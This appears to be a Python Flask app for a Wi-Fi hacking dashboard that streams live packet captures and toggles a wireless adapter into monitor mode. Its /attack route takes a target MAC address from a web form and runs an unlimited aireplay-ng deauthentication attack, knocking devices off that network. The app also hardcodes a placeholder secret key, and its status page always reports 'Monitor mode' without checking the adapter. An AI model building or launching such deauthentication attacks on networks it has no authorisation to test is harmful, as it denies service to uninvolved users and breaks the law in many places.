from flask import Flask, render_template, request
import subprocess
import re
import pyshark
from flask_socketio import SocketIO


app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key'
socketio = SocketIO(app)

current_interface = None
capture = None

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/live", methods=['GET', 'POST'])
def live():
    if request.method == 'POST':
        selected_interface = request.form.get('interface')
        socketio.emit('start_capture' , selected_interface)
        return render_template('live.html', selected_interface=selected_interface)
    interfaces = get_network_interfaces()
    return render_template('live.html', interfaces=interfaces, selected_interface=current_interface)

def get_network_interfaces():
    output = subprocess.check_output(['ifconfig']).decode('utf-8')
    interface_lines = re.findall(r'^([a-zA-Z0-9]+):', output, re.MULTILINE)
    interfaces = [line.strip(':') for line in interface_lines]
    return interfaces

def packet_capture(interface):
    capture = pyshark.LiveCapture(interface=interface)
    for packet in capture.sniff_continuously():
        packet_data = {
            'time': packet.frame_info.time,
            'source': packet.ip.src if 'ip' in packet else '',
            'destination': packet.ip.dst if 'ip' in packet else '',
        }
        socketio.emit('packet', packet_data, namespace='/')

@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('start_capture')
def handle_start_capture(interface):
    print(f'Starting packet capture for interface: {interface}')
    socketio.start_background_task(packet_capture, interface)


@app.route("/config", methods=["GET", "POST"])
def config():
    result = ""
    if request.method == "POST":
        mode = request.form.get("mode")
        command = []
        if mode == "monitor":
            command = [
                "airmon-ng",
                "start",
                "wlp0s20f0u2",
            ]  # Replace 'wlan0' with your wireless adapter name
        elif mode == "managed":
            command = [
                "airmon-ng",
                "stop",
                "wlp0s20f0u2",
            ]  # Replace 'wlan0' with your wireless adapter name
        else:
            return render_template("config.html", result="wrong mode")
        result =  mode.capitalize()
        try:
            subprocess.run(command, check=True)
            result = f"Device set to {result} mode"
        except Exception as error:
            print(error)
            result = f"Error configuring {result} mode"
    return render_template("config.html", result= result)


@app.route("/status")
def status():
    # Logic to retrieve the current status of the wireless adapter
    # Capture the output and pass it to the template
    adapter_status = "Monitor mode"
    return render_template("status.html", adapter_status=adapter_status)

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    # Deauthentication attack logic
    interface = 'wlp0s20f0u2'  # Replace 'wlan0' with your wireless adapter name
    target_mac = request.form.get('target_mac', '')  # Get the target MAC address from the form input
    result=""
    if request.method == 'POST' and target_mac:
        # Execute the deauthentication attack command
        command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]

        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, universal_newlines=True)
            result = "Deauthentication attack completed"
        except subprocess.CalledProcessError as e:
            output = e.output
            result = "Failed to execute deauthentication attack"
    return render_template("attack.html", result=result)



if __name__ == "__main__":
    socketio.run(app)
